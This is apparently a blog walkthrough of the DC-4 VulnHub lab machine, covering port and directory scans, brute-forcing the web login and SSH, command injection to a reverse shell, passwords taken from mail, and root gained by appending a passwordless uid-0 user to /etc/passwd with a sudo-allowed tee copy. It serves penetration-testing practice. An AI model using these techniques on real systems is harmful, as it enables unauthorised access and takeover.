---
layout: "post"
title: "DC 4 Walkthrough"
categories: [vulnhub, DC-Series]
tags: [dc-4 easy teehee]
---
DC-4 is a good beginner-friendly box. We `bruteforce` the website and get admin password. with the help of `OS command injection` vulnerability get shell on box. The old-password list gives password of user jim and mail from charles gives another password. We get root by adding user in `/etc/passwd` file using `teehee`. 

# Summery
- Portscan
- Bruteforce site to get admin password
- Command Injection
- Bruteforce SSH 
- Find password from mail
- Check Sudoers
- Add new user using teehee
- Root access
- The Flag

# Recon

## Portscan
```bash
Nmap scan report for 192.168.1.8
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Website
We have a login page on the website with title `Admin inforamtion Systems login` 
![mainpage](/assets/img/dc-4/mainpage.png)
## Gobuster
After running gobuster we see that we have a `command.php` but it redirect to login.php. I tried sql injection and other attacks but no luck. The final option is Bruteforce.

```bash
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8 -x php,html,txt -o go-main.out
/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 302)
/css (Status: 301)
/logout.php (Status: 302)
/command.php (Status: 302)
```
# Bruteforce using burpsuite
As per the site mainpage, I set username filed as `admin` and using burpsuite brute force the login page.

![burpsuite](/assets/img/dc-4/b1.png)
![burpsuite](/assets/img/dc-4/b2.png)

We get credentials.

```
username : admin
password : happy
```

# Command injection
After login we have command option by clicking this we can see list of commands.
Pick one of them and see the result.

![command](/assets/img/dc-4/command.png)
![command2](/assets/img/dc-4/command2.png)

So, I intercept the request in burp and send it to repeter.
Change the radio option to reverse shell, set up netcat listener and get the shell.

![reverse](/assets/img/dc-4/b3.png)
![nc](/assets/img/dc-4/nc.png)

# First User 
There are 3 user on box *charles, jim* and *sam*. We found old-password.txt in home directory of user jim.
![users](/assets/img/dc-4/users.png)
Now brute force the SSH and we get password for jim.
![hydra](/assets/img/dc-4/ssh.png)

Use this password to login to ssh.

```
username : jim
password : jibril04
```

# Second User
The jim directory has `mbox` which is an test email. So, I checked `/var/mail` folder there is mail for jim.

```
jim@dc-4:~$ ls
backups  mbox  test.sh
jim@dc-4:~$ cd /var/mail
jim@dc-4:/var/mail$ ls
jim
```

Mail has password for `charles`.
```
jim@dc-4:/var/mail$ cat jim
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
	(envelope-from <charles@dc-4>)
	id 1hCjIX-0000kO-Qt
	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```
Use this password to login to `charles`.

```
jim@dc-4:~$ su - charles
Password: 
charles@dc-4:~$ 
```

```
username : charles
Password : ^xHhA&hvim0y
```

# Privsec to root
Now I checked the sudoers list and found that I can run teehee command without password.

```
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

We can also see the help menu.

```
charles@dc-4:~$ teehee --help
Usage: teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn'         diagnose errors writing to any output
  'warn-nopipe'  diagnose errors writing to any output not a pipe
  'exit'         exit on error writing to any output
  'exit-nopipe'  exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'

```
This binary append standered input to file. I added user in the /etc/passwd.

```
charles@dc-4:~$ sudo teehee -a /etc/passwd
user::0:0:::/bin/bash 
user::0:0:::/bin/bash
^C
charles@dc-4:~$ su user
root@dc-4:/home/charles# 
```
# Root Flag

```bash
root@dc-4:/root# cat flag.txt 



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
